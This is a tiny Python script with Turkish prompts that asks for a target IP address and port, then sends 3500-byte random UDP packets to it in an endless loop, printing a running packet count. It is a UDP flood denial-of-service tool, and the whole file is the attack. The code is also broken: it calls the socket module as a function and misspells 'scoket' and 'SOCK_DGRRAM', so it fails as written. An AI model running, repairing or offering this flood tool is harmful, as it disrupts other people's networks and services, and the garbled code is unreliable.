import socket
import random
import os

os.system("clear")

hedef_ip = str(input("Lütfen hedef ipi giriniz: "))
hedef_port = int(input("Lütfen hedef port giriniz: "))

bytes = random._urandom(3500)

sock = socket(socket.AF_INET, scoket.SOCK_DGRRAM)

sayac = 0

while True:
	sock.sendto(bytes, (hedef_ip, hedef_port))
	sayac = sayac+1
	print("Gönderilen Paket: %s" %(sayac))